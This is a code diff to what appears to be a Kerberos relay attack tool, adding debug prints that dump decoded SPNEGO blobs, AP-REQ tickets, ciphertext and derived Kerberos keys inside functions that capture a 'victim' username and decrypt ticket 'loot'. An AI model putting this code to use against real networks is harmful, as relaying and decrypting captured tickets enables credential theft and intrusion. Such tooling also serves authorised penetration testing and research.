@@ -26,11 +26,17 @@ from Cryptodome.Hash import HMAC, MD4
 def get_auth_data(token, options):
     # Do we have a Krb ticket?
     blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
+
+    print(f"[🦝] Data blob:\n {blob}\n" + 30*"=")
+
     data = blob['innerContextToken']['negTokenInit']['mechToken']
     try:
         payload = decoder.decode(data, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
     except PyAsn1Error:
         raise Exception('Error obtaining Kerberos data')
+    
+    print(f"[🦝] Payload containing Kerberos data:\n {payload}\n" + 30*"=")
+
     # If so, assume all is fine and we can just pass this on to the legit server
     # we just need to get the correct target name
     apreq = payload['apReq']
@@ -45,20 +51,24 @@ def get_auth_data(token, options):
         username = options.victim
     else:
         username = f"unknown{random.randint(0, 10000):04d}$"
-    return {
+
+    result = {
         "domain": domain,
         "username": username,
         "krbauth": token,
         "service": sname,
         "apreq": apreq
     }
+    print(f"[🦝] Auth data dict:\n{result}\n" + 30*"=")
+    
+    return result
 
 def get_kerberos_loot(token, options):
     from pyasn1 import debug
     # debug.setLogger(debug.Debug('all'))
     # Do we have a Krb ticket?
     blob = decoder.decode(token, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
-    # print str(blob)
+    print(f"[🦝] Data blob:\n {blob}\n" + 30*"=")
 
     data = blob['innerContextToken']['negTokenInit']['mechToken']
 
@@ -69,11 +79,13 @@ def get_kerberos_loot(token, options):
     # print payload
     # It is an AP_REQ
     decodedTGS = payload['apReq']
+    print(f"[🦝] DecodedTGS:\n {decodedTGS}\n" + 30*"=")
     # print decodedTGS
 
     # Get ticket data
 
     cipherText = decodedTGS['ticket']['enc-part']['cipher']
+    print(f"[🦝] Ciphertext:\n {cipherText}\n" + 30*"=")
 
     # Key Usage 2
     # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
@@ -129,7 +141,8 @@ def get_kerberos_loot(token, options):
                     rawsecret = options.password
                 ekeys[cipher] = string_to_key(cipher, rawsecret, options.salt)
             LOG.debug('Calculated type %d Kerberos key: %s', cipher, hexlify(ekeys[cipher].contents))
-
+            
+    print(f"[🦝] ekeys:\n {ekeys}\n" + 30*"=")
     # Select the correct encryption key
     try:
         key = ekeys[decodedTGS['ticket']['enc-part']['etype']]
